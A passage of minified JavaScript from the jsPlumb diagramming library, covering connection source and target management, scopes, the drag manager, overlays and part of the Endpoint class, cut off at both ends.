r=n.target||n.srcElement,d=!1,_=o.getSelector(t,e),s=0;s<_.length;s++)if(_[s]===r){d=!0;break}return i?!d:d}(e,o.el,d.filter,this,d.filterExclude):d.filter(e,o.el)))return;var c=this.select({source:i}).length;if(l.maxConnections>=0&&c>=l.maxConnections)return w&&w({element:o.el,maxConnections:a},e),!1;var B=n.jsPlumb.getPositionOnElement(e,s,u),j={};n.jsPlumb.extend(j,d),j.isTemporarySource=!0,j.anchor=[B[0],B[1],0,0],j.dragOptions=h,l.def.scope&&(j.scope=l.def.scope),f=this.addEndpoint(i,j),g=!0,f.setDeleteOnEmpty(!0),l.uniqueEndpoint&&(l.endpoint?f.finalEndpoint=l.endpoint:(l.endpoint=f,f.setDeleteOnEmpty(!1)));var p=function n(){r.off(f.canvas,"mouseup",n),r.off(o.el,"mouseup",n),g&&(g=!1,r.deleteEndpoint(f))};r.on(f.canvas,"mouseup",p),r.on(o.el,"mouseup",p);var m={};if(l.def.extract)for(var v in l.def.extract){var C=(e.srcElement||e.target).getAttribute(v);C&&(m[l.def.extract[v]]=C)}r.trigger(f.canvas,"mousedown",e,m),t.consume(e)}}}.bind(this);this.on(o.el,"mousedown",m),l.trigger=m,d.filter&&(t.isString(d.filter)||t.isFunction(d.filter))&&r.setDragFilter(o.el,d.filter);var v=n.jsPlumb.extend({},d.dropOptions||{});sn(o,d,v,!0,!0===d.isTarget)}.bind(this),B=e.length&&e.constructor!==String?e:[e],h=0,j=B.length;h<j;h++)l(c(B[h]));return this},this.unmakeSource=function(n,t,e){var o=c(n);r.destroyDroppable(o.el,"internal");var i=this.sourceEndpointDefinitions[o.id];if(i)for(var d in i)if(null==t||t===d){var _=i[d].trigger;_&&r.off(o.el,"mousedown",_),e||delete this.sourceEndpointDefinitions[o.id][d]}return this},this.unmakeEverySource=function(){for(var n in this.sourceEndpointDefinitions)r.unmakeSource(n,null,!0);return this.sourceEndpointDefinitions={},this};var an=function(n,e,o){e=t.isArray(e)?e:[e];var i=W(n);o=o||"default";for(var r=0;r<e.length;r++){var d=this[e[r]][i];if(d&&d[o])return d[o].def.scope||this.Defaults.Scope}}.bind(this),wn=function(n,e,o,i){o=t.isArray(o)?o:[o];var r=W(n);i=i||"default";for(var d=0;d<o.length;d++){var _=this[o[d]][r];_&&_[i]&&(_[i].def.scope=e)}}.bind(this);this.getScope=function(n,t){return an(n,["sourceEndpointDefinitions","targetEndpointDefinitions"])},this.getSourceScope=function(n){return an(n,"sourceEndpointDefinitions")},this.getTargetScope=function(n){return an(n,"targetEndpointDefinitions")},this.setScope=function(n,t,e){this.setSourceScope(n,t,e),this.setTargetScope(n,t,e)},this.setSourceScope=function(n,t,e){wn(n,t,"sourceEndpointDefinitions",e),this.setDragScope(n,t)},this.setTargetScope=function(n,t,e){wn(n,t,"targetEndpointDefinitions",e),this.setDropScope(n,t)},this.unmakeEveryTarget=function(){for(var n in this.targetEndpointDefinitions)r.unmakeTarget(n,!0);return this.targetEndpointDefinitions={},this};var ln=function(n,e,o,i,d){var _,s,a,w="source"===n?this.sourceEndpointDefinitions:this.targetEndpointDefinitions;if(d=d||"default",e.length&&!t.isString(e)){_=[];for(var l=0,u=e.length;l<u;l++)w[(s=c(e[l])).id]&&w[s.id][d]&&(_[l]=w[s.id][d].enabled,a=i?!_[l]:o,w[s.id][d].enabled=a,r[a?"removeClass":"addClass"](s.el,"jtk-"+n+"-disabled"))}else{var B=(s=c(e)).id;w[B]&&w[B][d]&&(_=w[B][d].enabled,a=i?!_:o,w[B][d].enabled=a,r[a?"removeClass":"addClass"](s.el,"jtk-"+n+"-disabled"))}return _}.bind(this),un=function(n,e){return t.isString(n)||!n.length?e.apply(this,[n]):n.length?e.apply(this,[n[0]]):void 0}.bind(this);this.toggleSourceEnabled=function(n,t){return ln("source",n,null,!0,t),this.isSourceEnabled(n,t)},this.setSourceEnabled=function(n,t,e){return ln("source",n,t,null,e)},this.isSource=function(n,t){return t=t||"default",un(n,function(n){var e=this.sourceEndpointDefinitions[c(n).id];return null!=e&&null!=e[t]}.bind(this))},this.isSourceEnabled=function(n,t){return t=t||"default",un(n,function(n){var e=this.sourceEndpointDefinitions[c(n).id];return e&&e[t]&&!0===e[t].enabled}.bind(this))},this.toggleTargetEnabled=function(n,t){return ln("target",n,null,!0,t),this.isTargetEnabled(n,t)},this.isTarget=function(n,t){return t=t||"default",un(n,function(n){var e=this.targetEndpointDefinitions[c(n).id];return null!=e&&null!=e[t]}.bind(this))},this.isTargetEnabled=function(n,t){return t=t||"default",un(n,function(n){var e=this.targetEndpointDefinitions[c(n).id];return e&&e[t]&&!0===e[t].enabled}.bind(this))},this.setTargetEnabled=function(n,t,e){return ln("target",n,t,null,e)},this.ready=function(n){r.bind("ready",n)};var cn=function(n,t){if("object"==(void 0===n?"undefined":d()(n))&&n.length)for(var e=0,o=n.length;e<o;e++)t(n[e]);else t(n);return r};this.repaint=function(n,t,e){return cn(n,function(n){O(n,t,e)})},this.revalidate=function(n,t,e){return cn(n,function(n){var o=e?n:r.getId(n);r.updateOffset({elId:o,recalc:!0,timestamp:t});var i=r.getDragManager();i&&i.updateOffsets(o),r.repaint(n)})},this.repaintEverything=function(){var n,t=e();for(n in C)r.updateOffset({elId:n,recalc:!0,timestamp:t});for(n in C)O(n,null,t);return this},this.removeAllEndpoints=function(n,t,e){e=e||[];return function n(o){var i,d,_=c(o),s=C[_.id];if(s)for(e.push(_),i=0,d=s.length;i<d;i++)r.deleteEndpoint(s[i],!1);if(delete C[_.id],t&&_.el&&3!==_.el.nodeType&&8!==_.el.nodeType)for(i=0,d=_.el.childNodes.length;i<d;i++)n(_.el.childNodes[i])}(n),this};var Bn=function(n,t){r.removeAllEndpoints(n.id,!0,t);for(var e=r.getDragManager(),o=function(n){e&&e.elementRemoved(n.id),r.anchorManager.clearFor(n.id),r.anchorManager.removeFloatingConnection(n.id),r.isSource(n.el)&&r.unmakeSource(n.el),r.isTarget(n.el)&&r.unmakeTarget(n.el),r.destroyDraggable(n.el),r.destroyDroppable(n.el),delete r.floatingConnections[n.id],delete y[n.id],delete D[n.id],n.el&&(r.removeElement(n.el),n.el._jsPlumb=null)},i=1;i<t.length;i++)o(t[i]);o(n)};this.remove=function(n,t){var e=c(n),o=[];return e.text?e.el.parentNode.removeChild(e.el):e.id&&r.batch(function(){Bn(e,o)},!1===t),r},this.empty=function(n,t){var e=[];return r.batch(function(){!function n(t,o){var i=c(t);if(i.text)i.el.parentNode.removeChild(i.el);else if(i.el){for(;i.el.childNodes.length>0;)n(i.el.childNodes[0]);o||Bn(i,e)}}(n,!0)},!1===t),r},this.reset=function(n){r.silently(function(){on=!1,r.removeAllGroups(),r.removeGroupManager(),r.deleteEveryEndpoint(),n||r.unbind(),this.targetEndpointDefinitions={},this.sourceEndpointDefinitions={},v.length=0,this.doReset&&this.doReset()}.bind(this))};var hn=function(n){n.canvas&&n.canvas.parentNode&&n.canvas.parentNode.removeChild(n.canvas),n.cleanup(),n.destroy()};this.clear=function(){r.select().each(hn),r.selectEndpoints().each(hn),C={},b={}},this.setDefaultScope=function(n){return k=n,r},this.setDraggable=function(n,t){return j.each(n,function(n){r.isDragSupported(n)&&(E[r.getAttribute(n,"id")]=t,r.setElementDraggable(n,t))})},this.deriveEndpointAndAnchorSpec=function(n,t){for(var e=((t?"":"default ")+n).split(/[\s]/),o=null,i=null,d=null,_=null,s=0;s<e.length;s++){var a=r.getType(e[s],"connection");a&&(a.endpoints&&(o=a.endpoints),a.endpoint&&(i=a.endpoint),a.anchors&&(_=a.anchors),a.anchor&&(d=a.anchor))}return{endpoints:o||[i,i],anchors:_||[d,d]}},this.setId=function(n,e,o){var i;t.isString(n)?i=n:(n=this.getElement(n),i=this.getId(n));var r=this.getConnections({source:i,scope:"*"},!0),d=this.getConnections({target:i,scope:"*"},!0);e=""+e,o?n=this.getElement(e):(n=this.getElement(i),this.setAttribute(n,"id",e)),C[e]=C[i]||[];for(var _=0,s=C[e].length;_<s;_++)C[e][_].setElementId(e),C[e][_].setReferenceElement(n);delete C[i],this.sourceEndpointDefinitions[e]=this.sourceEndpointDefinitions[i],delete this.sourceEndpointDefinitions[i],this.targetEndpointDefinitions[e]=this.targetEndpointDefinitions[i],delete this.targetEndpointDefinitions[i],this.anchorManager.changeId(i,e);var a=this.getDragManager();a&&a.changeId(i,e),y[e]=y[i],delete y[i];var w=function(t,o,i){for(var r=0,d=t.length;r<d;r++)t[r].endpoints[o].setElementId(e),t[r].endpoints[o].setReferenceElement(n),t[r][i+"Id"]=e,t[r][i]=n};w(r,0,"source"),w(d,1,"target"),this.repaint(e)},this.setDebugLog=function(n){g=n},this.setSuspendDrawing=function(n,t){var e=S;return S=n,I=n?(new Date).getTime():null,t&&this.repaintEverything(),e},this.isSuspendDrawing=function(){return S},this.getSuspendedAt=function(){return I},this.batch=function(n,e){var o=this.isSuspendDrawing();o||this.setSuspendDrawing(!0);try{n()}catch(n){t.log("Function run while suspended failed",n)}o||this.setSuspendDrawing(!1,!e)},this.doWhileSuspended=this.batch,this.getCachedData=function(n){var t=D[n];return t?{o:t,s:A[n]}:_n({elId:n})},this.timestamp=e,this.show=function(n,t){return H(n,"block",t),r},this.toggleVisible=function(n,t){var e=null;t&&(e=function(n){var t=n.isVisible();n.setVisible(!t)}),V(n,function(n){var t=n.isVisible();n.setVisible(!t)},e)},this.toggleDraggable=function(n){var t;return j.each(n,function(n){var e=r.getAttribute(n,"id");return t=!(t=null!=E[e]&&E[e]),E[e]=t,r.setDraggable(n,t),t}.bind(this)),t},this.addListener=this.bind;var jn=[];this.registerFloatingConnection=function(n,e,o){jn[n.id]=e,t.addToList(C,n.id,o)},this.getFloatingConnectionFor=function(n){return jn[n]}};t.extend(n.jsPlumbInstance,t.EventGenerator,{setAttribute:function(n,t,e){this.setAttribute(n,t,e)},getAttribute:function(t,e){return this.getAttribute(n.jsPlumb.getElement(t),e)},convertToFullOverlaySpec:function(n){return t.isString(n)&&(n=[n,{}]),n[1].id=n[1].id||t.uuid(),n},registerConnectionType:function(t,e){if(this._connectionTypes[t]=n.jsPlumb.extend({},e),e.overlays){for(var o={},i=0;i<e.overlays.length;i++){var r=this.convertToFullOverlaySpec(e.overlays[i]);o[r[1].id]=r}this._connectionTypes[t].overlays=o}},registerConnectionTypes:function(n){for(var t in n)this.registerConnectionType(t,n[t])},registerEndpointType:function(t,e){if(this._endpointTypes[t]=n.jsPlumb.extend({},e),e.overlays){for(var o={},i=0;i<e.overlays.length;i++){var r=this.convertToFullOverlaySpec(e.overlays[i]);o[r[1].id]=r}this._endpointTypes[t].overlays=o}},registerEndpointTypes:function(n){for(var t in n)this.registerEndpointType(t,n[t])},getType:function(n,t){return"connection"===t?this._connectionTypes[n]:this._endpointTypes[n]},setIdChanged:function(n,t){this.setId(n,t,!0)},setParent:function(n,t){var e=this.getElement(n),o=this.getId(e),i=this.getElement(t),r=this.getId(i),d=this.getDragManager();e.parentNode.removeChild(e),i.appendChild(e),d&&d.setParent(e,o,i,r)},extend:function(n,t,e){var o;if(e)for(o=0;o<e.length;o++)n[e[o]]=t[e[o]];else for(o in t)n[o]=t[o];return n},floatingConnections:{},getFloatingAnchorIndex:function(n){return n.endpoints[0].isFloating()?0:n.endpoints[1].isFloating()?1:-1}}),h.prototype.Defaults={Anchor:"Bottom",Anchors:[null,null],ConnectionsDetachable:!0,ConnectionOverlays:[],Connector:"Bezier",Container:null,DoNotThrowErrors:!1,DragOptions:{},DropOptions:{},Endpoint:"Dot",EndpointOverlays:[],Endpoints:[null,null],EndpointStyle:{fill:"#456"},EndpointStyles:[null,null],EndpointHoverStyle:null,EndpointHoverStyles:[null,null],HoverPaintStyle:null,LabelStyle:{color:"black"},LogEnabled:!1,Overlays:[],MaxConnections:1,PaintStyle:{"stroke-width":4,stroke:"#456"},ReattachConnections:!1,RenderMode:"svg",Scope:"jsPlumb_DefaultScope"};var j=new h;n.jsPlumb=j,j.getInstance=function(n,t){var e=new h(n);if(t)for(var o in t)e[o]=t[o];return e.init(),e},j.each=function(n,t){if(null!=n)if("string"==typeof n)t(j.getElement(n));else if(null!=n.length)for(var e=0;e<n.length;e++)t(j.getElement(n[e]));else t(n)},"undefined"!=typeof exports&&(exports.jsPlumb=j)}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumbUtil,e=function(n,t){if(null==t)return[0,0];var e=_(t),o=d(e,0);return[o[n+"X"],o[n+"Y"]]},o=e.bind(this,"page"),i=e.bind(this,"screen"),r=e.bind(this,"client"),d=function(n,t){return n.item?n.item(t):n[t]},_=function(n){return n.touches&&n.touches.length>0?n.touches:n.changedTouches&&n.changedTouches.length>0?n.changedTouches:n.targetTouches&&n.targetTouches.length>0?n.targetTouches:[n]},s=function(n,t,e){t=function(n){return null==n?null:n.replace(/^\s\s*/,"").replace(/\s\s*$/,"")}(t),void 0!==n.className.baseVal?n.className.baseVal=t:n.className=t;try{for(var o=n.classList;o.length>0;)o.remove(o.item(0));for(var i=0;i<e.length;i++)e[i]&&o.add(e[i])}catch(n){console.log("JSPLUMB: cannot set class list",n)}},a=function(n){return void 0===n.className.baseVal?n.className:n.className.baseVal},w=function(n,e,o){e=null==e?[]:t.isArray(e)?e:e.split(/\s+/),o=null==o?[]:t.isArray(o)?o:o.split(/\s+/);var i=a(n).split(/\s+/),r=function(n,t){for(var e=0;e<t.length;e++)if(n)-1===i.indexOf(t[e])&&i.push(t[e]);else{var o=i.indexOf(t[e]);-1!==o&&i.splice(o,1)}};r(!0,e),r(!1,o),s(n,i.join(" "),i)};n.jsPlumb.extend(n.jsPlumbInstance.prototype,{headless:!1,pageLocation:o,screenLocation:i,clientLocation:r,getDragManager:function(){return null==this.dragManager&&(this.dragManager=new function(n){var t={},e=[],o={},i={},r={};this.register=function(d){var _=n.getId(d),s=n.getOffset(d);t[_]||(t[_]=d,e.push(d),o[_]={}),function t(e){if(e)for(var d=0;d<e.childNodes.length;d++)if(3!==e.childNodes[d].nodeType&&8!==e.childNodes[d].nodeType){var a=jsPlumb.getElement(e.childNodes[d]),w=n.getId(e.childNodes[d],null,!0);if(w&&i[w]&&i[w]>0){var l=n.getOffset(a);o[_][w]={id:w,offset:{left:l.left-s.left,top:l.top-s.top}},r[w]=_}t(e.childNodes[d])}}(d)},this.updateOffsets=function(t,e){if(null!=t){e=e||{};var i=jsPlumb.getElement(t),d=n.getId(i),_=o[d],s=n.getOffset(i);if(_)for(var a in _)if(_.hasOwnProperty(a)){var w=jsPlumb.getElement(a),l=e[a]||n.getOffset(w);if(null==w.offsetParent&&null!=o[d][a])continue;o[d][a]={id:a,offset:{left:l.left-s.left,top:l.top-s.top}},r[a]=d}}},this.endpointAdded=function(e,d){d=d||n.getId(e);var _=document.body,s=e.parentNode;for(i[d]=i[d]?i[d]+1:1;null!=s&&s!==_;){var a=n.getId(s,null,!0);if(a&&t[a]){var w=n.getOffset(s);if(null==o[a][d]){var l=n.getOffset(e);o[a][d]={id:d,offset:{left:l.left-w.left,top:l.top-w.top}},r[d]=a}break}s=s.parentNode}},this.endpointDeleted=function(n){if(i[n.elementId]&&--i[n.elementId]<=0)for(var t in o)o.hasOwnProperty(t)&&o[t]&&(delete o[t][n.elementId],delete r[n.elementId])},this.changeId=function(n,t){o[t]=o[n],o[n]={},r[t]=r[n],r[n]=null},this.getElementsForDraggable=function(n){return o[n]},this.elementRemoved=function(n){var t=r[n];t&&(delete o[t][n],delete r[n])},this.reset=function(){t={},e=[],o={},i={}},this.dragEnded=function(t){if(null!=t.offsetParent){var e=n.getId(t),o=r[e];o&&this.updateOffsets(o)}},this.setParent=function(t,e,i,d,_){var s=r[e];o[d]||(o[d]={});var a=n.getOffset(i),w=_||n.getOffset(t);s&&o[s]&&delete o[s][e],o[d][e]={id:e,offset:{left:w.left-a.left,top:w.top-a.top}},r[e]=d},this.clearParent=function(n,t){var e=r[t];e&&(delete o[e][t],delete r[t])},this.revalidateParent=function(t,e,o){var i=r[e];if(i){var d={};d[e]=o,this.updateOffsets(i,d),n.revalidate(i)}},this.getDragAncestor=function(t){var e=jsPlumb.getElement(t),o=n.getId(e),i=r[o];return i?jsPlumb.getElement(i):null}}(this)),this.dragManager},recalculateOffsets:function(n){this.getDragManager().updateOffsets(n)},createElement:function(n,t,e,o){return this.createElementNS(null,n,t,e,o)},createElementNS:function(n,t,e,o,i){var r,d=null==n?document.createElement(t):document.createElementNS(n,t);for(r in e=e||{})d.style[r]=e[r];for(r in o&&(d.className=o),i=i||{})d.setAttribute(r,""+i[r]);return d},getAttribute:function(n,t){return null!=n.getAttribute?n.getAttribute(t):null},setAttribute:function(n,t,e){null!=n.setAttribute&&n.setAttribute(t,e)},setAttributes:function(n,t){for(var e in t)t.hasOwnProperty(e)&&n.setAttribute(e,t[e])},appendToRoot:function(n){document.body.appendChild(n)},getRenderModes:function(){return["svg"]},getClass:a,addClass:function(n,t){jsPlumb.each(n,function(n){w(n,t)})},hasClass:function(n,t){return(n=jsPlumb.getElement(n)).classList?n.classList.contains(t):-1!==a(n).indexOf(t)},removeClass:function(n,t){jsPlumb.each(n,function(n){w(n,null,t)})},updateClasses:function(n,t,e){jsPlumb.each(n,function(n){w(n,t,e)})},setClass:function(n,t){null!=t&&jsPlumb.each(n,function(n){s(n,t,t.split(/\s+/))})},setPosition:function(n,t){n.style.left=t.left+"px",n.style.top=t.top+"px"},getPosition:function(n){var t=function(t){var e=n.style[t];return e?e.substring(0,e.length-2):0};return{left:t("left"),top:t("top")}},getStyle:function(n,t){return void 0!==window.getComputedStyle?getComputedStyle(n,null).getPropertyValue(t):n.currentStyle[t]},getSelector:function(n,t){return 1===arguments.length?null!=n.nodeType?n:document.querySelectorAll(n):n.querySelectorAll(t)},getOffset:function(n,t,e){n=jsPlumb.getElement(n),e=e||this.getContainer();for(var o={left:n.offsetLeft,top:n.offsetTop},i=t||null!=e&&n!==e&&n.offsetParent!==e?n.offsetParent:null,r=function(n){null!=n&&n!==document.body&&(n.scrollTop>0||n.scrollLeft>0)&&(o.left-=n.scrollLeft,o.top-=n.scrollTop)}.bind(this);null!=i;)o.left+=i.offsetLeft,o.top+=i.offsetTop,r(i),i=t?i.offsetParent:i.offsetParent===e?null:i.offsetParent;if(null!=e&&!t&&(e.scrollTop>0||e.scrollLeft>0)){var d=null!=n.offsetParent?this.getStyle(n.offsetParent,"position"):"static",_=this.getStyle(n,"position");"absolute"!==_&&"fixed"!==_&&"absolute"!==d&&"fixed"!==d&&(o.left-=e.scrollLeft,o.top-=e.scrollTop)}return o},getPositionOnElement:function(n,t,e){var o=void 0!==t.getBoundingClientRect?t.getBoundingClientRect():{left:0,top:0,width:0,height:0},i=document.body,r=document.documentElement,d=window.pageYOffset||r.scrollTop||i.scrollTop,_=window.pageXOffset||r.scrollLeft||i.scrollLeft,s=r.clientTop||i.clientTop||0,a=r.clientLeft||i.clientLeft||0,w=o.top+d-s+0*e,l=o.left+_-a+0*e,u=jsPlumb.pageLocation(n),c=o.width||t.offsetWidth*e,B=o.height||t.offsetHeight*e;return[(u[0]-l)/c,(u[1]-w)/B]},getAbsolutePosition:function(n){var t=function(t){var e=n.style[t];if(e)return parseFloat(e.substring(0,e.length-2))};return[t("left"),t("top")]},setAbsolutePosition:function(n,t,e,o){e?this.animate(n,{left:"+="+(t[0]-e[0]),top:"+="+(t[1]-e[1])},o):(n.style.left=t[0]+"px",n.style.top=t[1]+"px")},getSize:function(n){return[n.offsetWidth,n.offsetHeight]},getWidth:function(n){return n.offsetWidth},getHeight:function(n){return n.offsetHeight},getRenderMode:function(){return"svg"}})}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumb,e=n.jsPlumbUtil,o="__label",i=function(n,e){var i={cssClass:e.cssClass,labelStyle:n.labelStyle,id:o,component:n,_jsPlumb:n._jsPlumb.instance},r=t.extend(i,e);return new(t.Overlays[n._jsPlumb.instance.getRenderMode()].Label)(r)},r=function(n,o){var i=null;if(e.isArray(o)){var r=o[0],d=t.extend({component:n,_jsPlumb:n._jsPlumb.instance},o[1]);3===o.length&&t.extend(d,o[2]),i=new(t.Overlays[n._jsPlumb.instance.getRenderMode()][r])(d)}else i=o.constructor===String?new(t.Overlays[n._jsPlumb.instance.getRenderMode()][o])({component:n,_jsPlumb:n._jsPlumb.instance}):o;return i.id=i.id||e.uuid(),n.cacheTypeItem("overlay",i,i.id),n._jsPlumb.overlays[i.id]=i,i};t.OverlayCapableJsPlumbUIComponent=function(t){n.jsPlumbUIComponent.apply(this,arguments),this._jsPlumb.overlays={},this._jsPlumb.overlayPositions={},t.label&&(this.getDefaultType().overlays[o]=["Label",{label:t.label,location:t.labelLocation||this.defaultLabelLocation||.5,labelStyle:t.labelStyle||this._jsPlumb.instance.Defaults.LabelStyle,id:o}]),this.setListenerComponent=function(n){if(this._jsPlumb)for(var t in this._jsPlumb.overlays)this._jsPlumb.overlays[t].setListenerComponent(n)}},t.OverlayCapableJsPlumbUIComponent.applyType=function(n,t){if(t.overlays){var e,o={};for(e in t.overlays){var i=n._jsPlumb.overlays[t.overlays[e][1].id];if(i)i.updateFrom(t.overlays[e][1]),o[t.overlays[e][1].id]=!0;else{var r=n.getCachedTypeItem("overlay",t.overlays[e][1].id);null!=r?(r.reattach(n._jsPlumb.instance,n),r.setVisible(!0),r.updateFrom(t.overlays[e][1]),n._jsPlumb.overlays[r.id]=r):r=n.addOverlay(t.overlays[e],!0),o[r.id]=!0}}for(e in n._jsPlumb.overlays)null==o[n._jsPlumb.overlays[e].id]&&n.removeOverlay(n._jsPlumb.overlays[e].id,!0)}},e.extend(t.OverlayCapableJsPlumbUIComponent,n.jsPlumbUIComponent,{setHover:function(n,t){if(this._jsPlumb&&!this._jsPlumb.instance.isConnectionBeingDragged())for(var e in this._jsPlumb.overlays)this._jsPlumb.overlays[e][n?"addClass":"removeClass"](this._jsPlumb.instance.hoverClass)},addOverlay:function(n,t){var e=r(this,n);return t||this.repaint(),e},getOverlay:function(n){return this._jsPlumb.overlays[n]},getOverlays:function(){return this._jsPlumb.overlays},hideOverlay:function(n){var t=this.getOverlay(n);t&&t.hide()},hideOverlays:function(){for(var n in this._jsPlumb.overlays)this._jsPlumb.overlays[n].hide()},showOverlay:function(n){var t=this.getOverlay(n);t&&t.show()},showOverlays:function(){for(var n in this._jsPlumb.overlays)this._jsPlumb.overlays[n].show()},removeAllOverlays:function(n){for(var t in this._jsPlumb.overlays)this._jsPlumb.overlays[t].cleanup&&this._jsPlumb.overlays[t].cleanup();this._jsPlumb.overlays={},this._jsPlumb.overlayPositions=null,n||this.repaint()},removeOverlay:function(n,t){var e=this._jsPlumb.overlays[n];e&&(e.setVisible(!1),!t&&e.cleanup&&e.cleanup(),delete this._jsPlumb.overlays[n],this._jsPlumb.overlayPositions&&delete this._jsPlumb.overlayPositions[n])},removeOverlays:function(){for(var n=0,t=arguments.length;n<t;n++)this.removeOverlay(arguments[n])},moveParent:function(n){if(this.bgCanvas&&(this.bgCanvas.parentNode.removeChild(this.bgCanvas),n.appendChild(this.bgCanvas)),this.canvas&&this.canvas.parentNode)for(var t in this.canvas.parentNode.removeChild(this.canvas),n.appendChild(this.canvas),this._jsPlumb.overlays)if(this._jsPlumb.overlays[t].isAppendedAtTopLevel){var e=this._jsPlumb.overlays[t].getElement();e.parentNode.removeChild(e),n.appendChild(e)}},getLabel:function(){var n=this.getOverlay(o);return null!=n?n.getLabel():null},getLabelOverlay:function(){return this.getOverlay(o)},setLabel:function(n){var t=this.getOverlay(o);if(t)n.constructor===String||n.constructor===Function?t.setLabel(n):(n.label&&t.setLabel(n.label),n.location&&t.setLocation(n.location));else{var e=n.constructor===String||n.constructor===Function?{label:n}:n;t=i(this,e),this._jsPlumb.overlays[o]=t}this._jsPlumb.instance.isSuspendDrawing()||this.repaint()},cleanup:function(n){for(var t in this._jsPlumb.overlays)this._jsPlumb.overlays[t].cleanup(n),this._jsPlumb.overlays[t].destroy(n);n&&(this._jsPlumb.overlays={},this._jsPlumb.overlayPositions=null)},setVisible:function(n){this[n?"showOverlays":"hideOverlays"]()},setAbsoluteOverlayPosition:function(n,t){this._jsPlumb.overlayPositions[n.id]=t},getAbsoluteOverlayPosition:function(n){return this._jsPlumb.overlayPositions?this._jsPlumb.overlayPositions[n.id]:null},_clazzManip:function(n,t,e){if(!e)for(var o in this._jsPlumb.overlays)this._jsPlumb.overlays[o][n+"Class"](t)},addClass:function(n,t){this._clazzManip("add",n,t)},removeClass:function(n,t){this._clazzManip("remove",n,t)}})}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumb,e=n.jsPlumbUtil,o=["connectorStyle","connectorHoverStyle","connectorOverlays","connector","connectionType","connectorClass","connectorHoverClass"];t.Endpoint=function(n){var i=n._jsPlumb,r=n.newConnection,_=n.newEndpoint;this.idPrefix="_jsplumb_e_",this.defaultLabelLocation=[.5,.5],this.defaultOverlayKeys=["Overlays","EndpointOverlays"],t.OverlayCapableJsPlumbUIComponent.apply(this,arguments),this.appendToDefaultType({connectionType:n.connectionType,maxConnections:null==n.maxConnections?this._jsPlumb.instance.Defaults.MaxConnections:n.maxConnections,paintStyle:n.endpointStyle||n.paintStyle||n.style||this._jsPlumb.instance.Defaults.EndpointStyle||t.Defaults.EndpointStyle,hoverPaintStyle:n.endpointHoverStyle||n.hoverPaintStyle||this._jsPlumb.instance.Defaults.EndpointHoverStyle||t.Defaults.EndpointHoverStyle,connectorStyle:n.connectorStyle,connectorHoverStyle:n.connectorHoverStyle,connectorClass:n.connectorClass,connectorHoverClass:n.connectorHoverClass,connectorOverlays:n.connectorOverlays,connector:n.connector,connectorTooltip:n.connectorTooltip}),this._jsPlumb.enabled=!(!1===n.enabled),this._jsPlumb.visible=!0,this.element=t.getElement(n.source),this._jsPlumb.uuid=n.uuid,this._jsPlumb.floatingEndpoint=null;this._jsPlumb.uuid&&(n.endpointsByUUID[this._jsPlumb.uuid]=this),this.elementId=n.elementId,this.dragProxy=n.dragProxy,this._jsPlumb.connectionCost=n.connectionCost,this._jsPlumb.connectionsDirected=n.connectionsDirected,this._jsPlumb.currentAnchorClass="",this._jsPlumb.events={};var s=!0===n.deleteOnEmpty;this.setDeleteOnEmpty=function(n){s=n};var a=function(){var n=i.endpointAnchorClassPrefix+"-"+this._jsPlumb.currentAnchorClass;this._jsPlumb.currentAnchorClass=this.anchor.getCssClass();var e=i.endpointAnchorClassPrefix+(this._jsPlumb.currentAnchorClass?"-"+this._jsPlumb.currentAnchorClass:"");this.removeClass(n),this.addClass(e),t.updateClasses(this.element,e,n)}.bind(this);this.prepareAnchor=function(n){var t=this._jsPlumb.instance.makeAnchor(n,this.elementId,i);return t.bind("anchorChanged",function(n){this.fire("anchorChanged",{endpoint:this,anchor:n}),a()}.bind(this)),t},this.setPreparedAnchor=function(n,t){return this._jsPlumb.instance.continuousAnchorFactory.clear(this.elementId),this.anchor=n,a(),t||this._jsPlumb.instance.repaint(this.elementId),this},this.setAnchor=function(n,t){var e=this.prepareAnchor(n);return this.setPreparedAnchor(e,t),this};var w=function(n){if(this.connections.length>0)for(var t=0;t<this.connections.length;t++)this.connections[t].setHover(n,!1);else this.setHover(n)}.bind(this);this.bind("mouseover",function(){w(!0)}),this.bind("mouseout",function(){w(!1)}),n._transient||this._jsPlumb.instance.anchorManager.add(this,this.elementId),this.prepareEndpoint=function(o,r){var d,_=function(n,e){var o=i.getRenderMode();if(t.Endpoints[o][n])return new t.Endpoints[o][n](e);if(!i.Defaults.DoNotThrowErrors)throw{msg:"jsPlumb: unknown endpoint type '"+n+"'"}},s={_jsPlumb:this._jsPlumb.instance,cssClass:n.cssClass,container:n.container,tooltip:n.tooltip,connectorTooltip:n.connectorTooltip,endpoint:this};return e.isString(o)?d=_(o,s):e.isArray(o)?(s=e.merge(o[1],s),d=_(o[0],s)):d=o.clone(),d.clone=function(){return e.isString(o)?_(o,s):e.isArray(o)?(s=e.merge(o[1],s),_(o[0],s)):void 0}.bind(this),d.typeId=r,d},this.setEndpoint=function(n,t){var e=this.prepareEndpoint(n);this.setPreparedEndpoint(e,!0)},this.setPreparedEndpoint=function(n,t){null!=this.endpoint&&(this.endpoint.cleanup(),this.endpoint.destroy()),this.endpoint=n,this.type=this.endpoint.type,this.canvas=this.endpoint.canvas},t.extend(this,n,o),this.isSource=n.isSource||!1,this.isTemporarySource=n.isTemporarySource||!1,this.isTarget=n.isTarget||!1,this.connections=n.connections||[],this.connectorPointerEvents=n["connector-pointer-events"],this.scope=n.scope||i.getDefaultScope(),this.timestamp=null,this.reattachConnections=n.reattach||i.Defaults.ReattachConnections,this.connectionsDetachable=i.Defaults.ConnectionsDetachable,!1!==n.connectionsDetachable&&!1!==n.detachable||(this.connectionsDetachable=!1),this.dragAllowedWhenFull=!1!==n.dragAllowedWhenFull,n.onMaxConnections&&this.bind("maxConnections",n.onMaxConnections),this.addConnection=function(n){this.connections.push(n),this[(this.connections.length>0?"add":"remove")+"Class"](i.endpointConnectedClass),this[(this.isFull()?"add":"remove")+"Class"](i.endpointFullClass)},this.detachFromConnection=function(n,t,e){(t=null==t?this.connections.indexOf(n):t)>=0&&(this.connections.splice(t,1),this[(this.connections.length>0?"add":"remove")+"Class"](i.endpointConnectedClass),this[(this.isFull()?"add":"remove")+"Class"](i.endpointFullClass)),!e&&s&&0===this.connections.length&&i.deleteObject({endpoint:this,fireEvent:!1,deleteAttachedObjects:!0!==e})},this.deleteEveryConnection=function(n){for(var t=this.connections.length,e=0;e<t;e++)i.deleteConnection(this.connections[0],n)},this.detachFrom=function(n,t,e){for(var o=[],r=0;r<this.connections.length;r++)this.connections[r].endpoints[1]!==n&&this.connections[r].endpoints[0]!==n||o.push(this.connections[r]);for(var 